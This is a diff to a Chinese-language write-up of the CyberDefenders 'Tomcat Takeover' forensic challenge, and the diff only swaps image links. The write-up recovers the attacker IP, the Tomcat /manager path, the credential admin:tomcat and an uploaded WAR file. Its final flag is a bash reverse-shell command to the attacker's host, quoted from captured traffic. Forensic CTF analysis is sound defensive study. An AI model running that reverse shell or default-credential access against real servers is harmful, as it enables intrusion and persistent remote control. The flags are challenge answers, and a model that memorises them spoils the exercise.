@@ -21,7 +21,7 @@ Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions
 
 ### Exploit
 可以看到**14.0.0.120**和內網的`10.0.0.112`，代表前者應該就是此次的外部攻擊者
-![image](https://hackmd.io/_uploads/HkPNR5tUp.png)
+![image](/assets/posts/CyberDefender - Tomcat Takeover/HkPNR5tUp.png)
 
 Flag: `14.0.0.120`
 
@@ -33,7 +33,7 @@ Flag: `14.0.0.120`
 
 ### Exploit
 這一題問的是city，不是province，所以要填廣州，不是廣東
-![image](https://hackmd.io/_uploads/HJakbiFIT.png)
+![image](/assets/posts/CyberDefender - Tomcat Takeover/HJakbiFIT.png)
 
 Flag: `Guangzhou`
 
@@ -66,11 +66,11 @@ Flag: `Gobuster`
 
 ### Exploit
 根據extracted file的內容，在#20649附近的stream已經可以拿到reverse shell了，代表從這邊往前可能是個不錯的選擇
-![image](https://hackmd.io/_uploads/ByRj4ot8a.png)
+![image](/assets/posts/CyberDefender - Tomcat Takeover/ByRj4ot8a.png)
 果不其然，它的順序一定是先爆路徑，之後再想怎麼塞reverse shell，所以從下圖可以知道有一大堆的404 error request，跟著他的stream就可以看到最重要的那個sub-path
-![image](https://hackmd.io/_uploads/H1YNVjKIa.png)
+![image](/assets/posts/CyberDefender - Tomcat Takeover/H1YNVjKIa.png)
 又題目說到該頁面是個admin panel，代表應該是個可以登入做authentication的地方，所以後續看到的第一個status code 200的/example就不是我們的目標，而是再更後面的/manager，因為它有login stage
-![image](https://hackmd.io/_uploads/H1CjUsK8a.png)
+![image](/assets/posts/CyberDefender - Tomcat Takeover/H1CjUsK8a.png)
 
 Flag: `/manager`
 
@@ -82,7 +82,7 @@ Flag: `/manager`
 
 ### Exploit
 從下圖可以發現，往後刷幾個packets就有一個status 200的response，也就是attacker成功嘗試登入的response，從這邊把credential抓到base64 decode就會發現帳密
-![image](https://hackmd.io/_uploads/HyM5DoYUT.png)
+![image](/assets/posts/CyberDefender - Tomcat Takeover/HyM5DoYUT.png)
 
 Flag: `admin:tomcat`
 
@@ -93,7 +93,7 @@ Flag: `admin:tomcat`
 往後看tcp stream會發現manager有upload的功能，所以attacker嘗試上傳一些東西，應該是一個zip file
 
 ### Exploit
-![image](https://hackmd.io/_uploads/BJCtKjF8T.png)
+![image](/assets/posts/CyberDefender - Tomcat Takeover/BJCtKjF8T.png)
 
 Flag: `jxqozy.war`
 
@@ -104,6 +104,6 @@ Flag: `jxqozy.war`
 再往後看同一個stream的其他packet，發現server response 200，上傳成功後就可以直接進入reverse shell，接著就是看它的指令，發現他想要常駐在該台電腦上
 
 ### Exploit
-![image](https://hackmd.io/_uploads/B12M5stLa.png)
+![image](/assets/posts/CyberDefender - Tomcat Takeover/B12M5stLa.png)
 
 Flag: `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
